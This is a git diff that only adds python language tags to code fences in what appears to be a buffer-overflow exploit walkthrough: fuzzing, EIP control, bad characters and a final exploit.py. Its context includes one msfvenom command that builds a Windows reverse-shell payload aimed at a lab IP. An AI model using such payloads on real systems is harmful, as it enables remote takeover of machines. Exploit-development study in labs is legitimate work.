@@ -112,7 +112,7 @@ Time to fire up the win7 VM, get it running, and take a look with Immunity Debug
 
 We can test the size of the buffer by fuzzing it with a simple python script.
 
-```
+```python
 
 #!/usr/bin/python
 
@@ -184,7 +184,7 @@ Replace the payload with the generated pattern.
 
 The exploit should now look like this:
 
-```
+```python
 
 #!/usr/bin/python
 
@@ -262,7 +262,7 @@ and with the ESP register pointing to `CCCC`, with a bunch of DDDD's in the trai
 
 I've got it saved as control_eip.py
 
-```
+```python
 
 #!/usr/bin/env python2
 import socket
@@ -332,7 +332,7 @@ These characters are 'bad characters' that we want to avoid including in the she
 
 `badchar-test.py`
 
-```
+```python
 
 #!/usr/bin/env python2
 import socket
@@ -471,7 +471,7 @@ metasm > sub esp,0x10
 <h3>Poppin' Calc - B</h3>
 
 
-```
+```python
 
 #!/usr/bin/env python2
 import socket
@@ -544,7 +544,7 @@ msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=443 -f python -v 
 
 The final exploit is saved simply as `exploit.py`
 
-```
+```python
 
 #!/usr/bin/env python2
 import socket
